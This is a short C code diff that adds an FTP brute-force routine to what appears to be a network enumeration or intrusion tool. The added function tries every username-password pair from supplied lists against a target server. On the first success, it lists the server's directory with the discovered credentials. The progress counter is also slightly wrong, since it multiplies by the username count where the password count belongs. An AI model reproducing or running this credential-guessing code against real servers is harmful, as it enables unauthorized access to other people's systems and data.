@@ -122,3 +122,18 @@ BOOL FtpEnum(char* serverIp, BOOL isBurtForce, FILE* pFile) {
     } 
     return isFtpCreadValid;
 }
+BOOL FtpBruteForce(char* serverIp,char** usernameList,UINT usernameListSize, char** passwordList, UINT passwordListSize, FILE* pFile) {
+    BOOL isFtpCreadValid = FALSE;
+    
+    printOut(pFile, "\t[FTP] Brute Forcing FTP server:\n");
+    for (UINT i = 0; i < usernameListSize && !isFtpCreadValid; i++) {
+        for (UINT j = 0; j < passwordListSize && !isFtpCreadValid; j++) {
+            printOut(pFile, "\t%i/%i\r", i * usernameListSize + j, passwordListSize * usernameListSize);
+            isFtpCreadValid = TestPasswordFTP(serverIp, usernameList[i], passwordList[j]);
+            if (isFtpCreadValid) {
+                ListCurrentDirectory(serverIp, (char*)usernameList[i], (char*)passwordList[j]);
+            }
+        }
+    }
+    return isFtpCreadValid;
+}
